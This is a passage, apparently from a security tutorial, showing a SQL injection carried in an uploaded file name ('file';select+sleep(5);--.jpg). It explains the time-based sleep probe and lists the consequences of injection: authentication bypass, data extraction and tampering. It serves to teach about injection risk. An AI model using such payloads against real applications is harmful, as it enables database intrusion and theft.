SELECT * FROM files WHERE filename = 'file';select+sleep(5);--.jpg';
```
- The `--` in SQL is a comment, so the rest of the query is ignored.
- The `select+sleep(5);` command causes the database to pause for 5 seconds, which is useful for testing SQL injection and might indicate that the application is vulnerable to further attacks.

#### **How this leads to SQL Injection**:
If the application uses the file name directly in an SQL query without sanitizing it, attackers could potentially modify the query to:
- **Bypass authentication**: Injecting SQL to log in as an administrator.
- **Extract data**: Using SQL injection to read sensitive information from the database.
- **Modify or delete data**: SQL injection can allow attackers to modify or delete records in the database.
